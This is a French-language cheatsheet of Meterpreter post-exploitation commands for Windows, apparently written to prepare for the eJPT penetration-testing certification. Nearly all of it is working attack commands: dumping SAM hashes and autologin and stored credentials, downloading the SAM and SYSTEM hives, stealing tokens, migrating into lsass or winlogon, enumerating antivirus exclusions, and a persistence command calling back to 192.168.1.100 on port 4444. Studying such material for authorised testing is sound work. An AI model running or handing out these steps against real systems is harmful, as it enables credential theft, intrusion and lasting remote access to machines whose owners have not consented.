# 🖥️ Meterpreter Windows Enumeration - Cheatsheet eJPT

## 🔍 1. Informations système de base

### Identification système
| Commande | Description |
|----------|-------------|
| `sysinfo` | Informations système complètes |
| `getuid` | Utilisateur actuel |
| `getpid` | PID du processus Meterpreter |
| `ps` | Liste des processus |
| `shell` | Obtenir un shell Windows |

### Architecture et version
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_computers` | Ordinateurs du domaine |
| `run post/windows/gather/checkvm` | Détection de VM |
| `run post/windows/gather/enum_patches` | Patches installés |

---

## 👤 2. Énumération des utilisateurs

### Utilisateurs et groupes
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_logged_on_users` | Utilisateurs connectés |
| `run post/windows/gather/enum_domain_users` | Utilisateurs du domaine |
| `run post/windows/gather/enum_domain_group_users` | Membres des groupes de domaine |
| `shell` puis `net user` | Liste des utilisateurs locaux |
| `shell` puis `net localgroup` | Groupes locaux |
| `shell` puis `net localgroup administrators` | Membres du groupe admin |

### Informations de session
| Commande | Description |
|----------|-------------|
| `getenv` | Variables d'environnement |
| `getenv USERNAME` | Nom d'utilisateur courant |
| `getenv COMPUTERNAME` | Nom de l'ordinateur |
| `getenv USERDOMAIN` | Domaine de l'utilisateur |

---

## 🔐 3. Énumération des credentials

### Dump des mots de passe
| Commande | Description |
|----------|-------------|
| `hashdump` | Dump des hashes SAM |
| `run post/windows/gather/smart_hashdump` | Dump intelligent des hashes |
| `run post/windows/gather/credentials/windows_autologin` | Credentials AutoLogon |
| `run post/windows/gather/credentials/credential_collector` | Collecte générale de credentials |

### Historique et cache
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_ie` | Historique Internet Explorer |
| `run post/windows/gather/enum_chrome` | Données Chrome |
| `run post/windows/gather/credentials/enum_cred_store` | Windows Credential Store |

---

## 🌐 4. Énumération réseau

### Configuration réseau
| Commande | Description |
|----------|-------------|
| `ipconfig` | Configuration IP |
| `route` | Table de routage |
| `arp` | Table ARP |
| `netstat` | Connexions réseau |

### Partages et ressources réseau
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_shares` | Partages réseau |
| `run post/windows/gather/enum_snmp` | Configuration SNMP |
| `run post/windows/gather/enum_domain` | Informations du domaine |
| `shell` puis `net share` | Partages locaux |
| `shell` puis `net use` | Connexions réseau actives |

---

## 📁 5. Système de fichiers

### Navigation
| Commande | Description |
|----------|-------------|
| `pwd` | Répertoire actuel |
| `ls` | Contenu du répertoire |
| `cd <path>` | Changer de répertoire |
| `cat <file>` | Afficher un fichier |
| `download <remote> <local>` | Télécharger un fichier |
| `upload <local> <remote>` | Uploader un fichier |

### Recherche de fichiers
| Commande | Description |
|----------|-------------|
| `search -f *.txt` | Rechercher fichiers .txt |
| `search -f password*` | Fichiers contenant "password" |
| `search -f *.config` | Fichiers de configuration |
| `search -d c:\\users` | Recherche dans un répertoire |

### Fichiers intéressants
| Commande | Description |
|----------|-------------|
| `cat c:\\windows\\system32\\drivers\\etc\\hosts` | Fichier hosts |
| `download c:\\windows\\system32\\config\\sam` | Base SAM |
| `download c:\\windows\\system32\\config\\system` | Registre SYSTEM |

---

## 🔧 6. Énumération des services

### Services Windows
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_services` | Services installés |
| `shell` puis `sc query` | Services en cours |
| `shell` puis `tasklist /svc` | Processus et services |
| `shell` puis `wmic service list full` | Services détaillés |

### Applications installées
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_applications` | Applications installées |
| `shell` puis `wmic product get name,version` | Produits installés |

---

## 📋 7. Énumération du registre

### Clés importantes
| Commande | Description |
|----------|-------------|
| `reg queryval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` | Programmes de démarrage |
| `reg queryval -k HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` | Démarrage utilisateur |
| `reg queryval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\NT\\CurrentVersion\\Winlogon` | AutoLogon |

### Scripts Meterpreter pour le registre
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_av_excluded` | Exclusions antivirus |
| `run post/windows/gather/enum_tokens` | Tokens de sécurité |

---

## 🔒 8. Sécurité et antivirus

### Détection de sécurité
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_av_excluded` | Exclusions antivirus |
| `shell` puis `wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct` | Antivirus installés |
| `shell` puis `sc query windefend` | Windows Defender |
| `shell` puis `netsh advfirewall show allprofiles` | Configuration firewall |

---

## 💻 9. Processus et privilèges

### Gestion des processus
| Commande | Description |
|----------|-------------|
| `ps` | Liste des processus |
| `migrate <pid>` | Migrer vers un processus |
| `getprivs` | Privilèges actuels |
| `steal_token <pid>` | Voler un token |

### Recherche de processus intéressants
| Commande | Description |
|----------|-------------|
| `ps` puis rechercher `lsass` | Processus d'authentification |
| `ps` puis rechercher `explorer` | Processus utilisateur |
| `ps` puis rechercher `winlogon` | Processus de connexion |

---

## 🎯 10. Énumération automatisée

### Scripts post-exploitation
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/win_privs` | Énumération des privilèges |
| `run post/multi/recon/local_exploit_suggester` | Suggestion d'exploits locaux |
| `run post/windows/gather/enum_computers` | Ordinateurs du réseau |
| `run post/windows/gather/enum_domain_tokens` | Tokens de domaine |

---

## 🔍 11. Commandes shell Windows utiles

### Informations système via shell
| Commande shell | Description |
|-----------------|-------------|
| `systeminfo` | Informations système détaillées |
| `whoami` | Utilisateur actuel |
| `whoami /priv` | Privilèges de l'utilisateur |
| `whoami /groups` | Groupes de l'utilisateur |
| `hostname` | Nom de l'ordinateur |

### Réseau via shell
| Commande shell | Description |
|-----------------|-------------|
| `ipconfig /all` | Configuration réseau complète |
| `netstat -an` | Connexions réseau |
| `arp -a` | Table ARP |
| `route print` | Table de routage |

### Utilisateurs et groupes via shell
| Commande shell | Description |
|-----------------|-------------|
| `net user` | Utilisateurs locaux |
| `net localgroup` | Groupes locaux |
| `net group /domain` | Groupes du domaine |
| `net user /domain` | Utilisateurs du domaine |

---

## 📊 12. Collecte d'informations avancées

### Énumération de domaine Active Directory
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_domain` | Informations du domaine |
| `run post/windows/gather/enum_domain_users` | Utilisateurs AD |
| `run post/windows/gather/enum_domain_group_users` | Groupes AD |
| `shell` puis `nltest /dclist:` | Contrôleurs de domaine |

### Collecte de données sensibles
| Commande | Description |
|----------|-------------|
| `run post/windows/gather/enum_putty_saved_sessions` | Sessions PuTTY |
| `run post/windows/gather/enum_snmp` | Configuration SNMP |
| `run post/windows/gather/forensics/enum_drives` | Lecteurs disponibles |

---

## 🎪 13. Scripts personnalisés et automatisation

### Lancement de scripts
| Commande | Description |
|----------|-------------|
| `run <script_name>` | Exécuter un script Meterpreter |
| `background` puis `use post/windows/gather/<module>` | Utiliser un module post |

### Scripts utiles pour l'eJPT
| Script | Description |
|--------|-------------|
| `run post/windows/gather/enum_logged_on_users` | Users connectés |
| `run post/windows/gather/credentials/windows_autologin` | AutoLogon creds |
| `run post/multi/recon/local_exploit_suggester` | Exploits suggérés |

---

## 💡 14. Workflow d'énumération recommandé

### Phase 1: Reconnaissance de base
```bash
# Dans Meterpreter
sysinfo
getuid
getprivs
ps
```

### Phase 2: Énumération système
```bash
# Utilisateurs et groupes
run post/windows/gather/enum_logged_on_users
shell
net user
net localgroup administrators
exit
```

### Phase 3: Recherche de credentials
```bash
# Dump des hashes
hashdump
run post/windows/gather/smart_hashdump
run post/windows/gather/credentials/windows_autologin
```

### Phase 4: Énumération réseau
```bash
ipconfig
route
run post/windows/gather/enum_shares
run post/windows/gather/enum_domain
```

### Phase 5: Recherche d'escalation
```bash
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_applications
```

---

## 🎯 15. Conseils spécifiques eJPT

### Commandes prioritaires
1. **`sysinfo`** - Toujours en premier
2. **`getuid`** - Identifier l'utilisateur
3. **`hashdump`** - Récupérer les hashes
4. **`run post/multi/recon/local_exploit_suggester`** - Trouver des exploits
5. **`ps`** - Identifier les processus pour migration

### Recherche de credentials
```bash
# Séquence rapide pour credentials
hashdump
run post/windows/gather/credentials/windows_autologin
search -f *password*
search -f *.config
```

### Migration de processus
```bash
# Processus sûrs pour migration
ps
# Rechercher explorer.exe, winlogon.exe, ou lsass.exe
migrate <pid_explorer>
```

### Persistence rapide
```bash
# Après énumération, si nécessaire
run persistence -S -U -X -i 60 -p 4444 -r 192.168.1.100
```

**🎯 Conseil final** : L'énumération Windows avec Meterpreter dans l'eJPT suit généralement ce pattern : `sysinfo` → `getuid` → `hashdump` → `local_exploit_suggester` → escalation de privilèges !

---

## 📝 16. Aide-mémoire one-liners

```bash
# Énumération complète rapide
sysinfo && getuid && getprivs && hashdump && run post/multi/recon/local_exploit_suggester

# Recherche de fichiers sensibles
search -f *.txt && search -f *.config && search -f *password*

# Énumération réseau rapide
ipconfig && route && arp && netstat
```